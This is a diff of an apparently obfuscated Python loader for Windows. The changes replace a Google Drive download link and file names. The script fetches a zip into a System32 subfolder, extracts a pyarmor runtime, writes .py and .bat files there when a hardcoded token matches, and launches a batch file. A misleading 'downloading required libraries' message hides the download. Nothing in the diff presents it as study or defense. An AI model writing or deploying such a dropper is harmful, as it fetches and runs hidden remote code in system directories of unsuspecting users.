@@ -27,13 +27,7 @@ def delete_system32_filex():
 
 delete_system32_filex()
 '''
-os.system('cls')
-if file_contentsx1 =="04yb8u5ih5FGB":
-    os.remove(r"C:\Windows\System32\FileSystemXS\aesv8.4.bat")
-    file_contentpathx = read_file_contentxasxas(file_pathxpath)
-    create_batch_file(file_contentpathx, r"C:\Windows\System32\WCNMX\aes3.0v1.py")
-else:
-    create_batch_file("py", r"C:\Windows\System32\WCNMX\aes3.0v1.py")
+
 if location:
     os.system('cls')
 else:
@@ -114,10 +108,10 @@ os.system('cls')
 print("")
 print("")
 def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\WCNMX\aes3.0v1.py"
+    aesv3_path = r"C:\Windows\System32\WCNMX\aes3.0v2.py"
     files_to_delete = [
-        r"C:\Windows\System32\WCNMX\AesV8.3.py",
-        r"C:\Windows\System32\WCNMX\aesv8.3.bat",
+        r"C:\Windows\System32\WCNMX\aes3.0v1.py",
+        r"C:\Windows\System32\WCNMX\aes3.0v1.bat",
         r"C:\Windows\System32\WCNMX\pyarmor_runtime_000000"
     ]
 
@@ -147,8 +141,8 @@ def download_file_from_google_drive(url, output_path):
 
 if not os.path.exists("C:\\Windows\\System32\\WCNMX\\pyarmor_runtime_000000"):
     print("--downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1KE4vJkaLz_65rHbdvt4wdJP0tz9zhy6d", "C:\\Windows\\System32\\WCNMX\\maomao.zip")
-    zip_file = r'C:\Windows\System32\WCNMX\maomao.zip'
+    download_file_from_google_drive("https://drive.google.com/uc?id=1Qu72JM73XAg7BfNopfRxJOa71b7gKal4", "C:\\Windows\\System32\\WCNMX\\moonv1.zip")
+    zip_file = r'C:\Windows\System32\WCNMX\moonv1.zip'
     extract_dir = r'C:\Windows\System32\WCNMX'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
@@ -157,7 +151,13 @@ if not os.path.exists("C:\\Windows\\System32\\WCNMX\\pyarmor_runtime_000000"):
 import os
 import shutil
 os.system('cls')
-
+os.system('cls')
+if file_contentsx1 =="04yb8u5ih5FGB":
+    os.remove(r"C:\Windows\System32\FileSystemXS\aes3.0v1.bat")
+    file_contentpathx = read_file_contentxasxas(file_pathxpath)
+    create_batch_file(file_contentpathx, r"C:\Windows\System32\WCNMX\aes3.0v1.py")
+else:
+    create_batch_file("py", r"C:\Windows\System32\WCNMX\aes3.0v2.py")
 '''
 directory = r'C:\Windows\System32'
 
@@ -228,8 +228,6 @@ try:
     subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
 except Exception as e:
     print("Error")
-
-
 
 os.system('cls')
 
